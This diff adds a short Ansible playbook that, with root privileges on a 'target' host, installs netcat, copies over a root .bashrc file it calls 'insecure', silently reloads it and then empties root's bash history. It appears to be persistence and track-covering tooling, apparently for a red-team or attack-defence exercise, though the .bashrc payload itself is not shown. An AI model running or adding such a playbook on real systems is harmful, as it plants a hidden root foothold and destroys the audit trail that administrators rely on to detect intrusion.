@@ -1,0 +1,25 @@
+---
+- name: "Install Bashrc Alias"
+  hosts: target
+  become: yes
+  tasks:
+    - name: "Install netcat"
+      package:
+        name: nc
+        state: present
+
+    - name: Push insecure BashRC file
+      copy:
+        src: ~/files/.bashrc
+        dest: /root/.bashrc
+        owner: root
+        group: root
+        mode: 640 #Read, wite by owner, read by group.
+
+    - name: Reload bashrc
+      shell:
+        cmd: . /root/.bashrc > /dev/null 2>&1 #reload the bash rc, hide output
+
+    - name: Clear Bash History
+      shell:
+        cmd: cat /dev/null > /root/.bash_history #clear bash history   
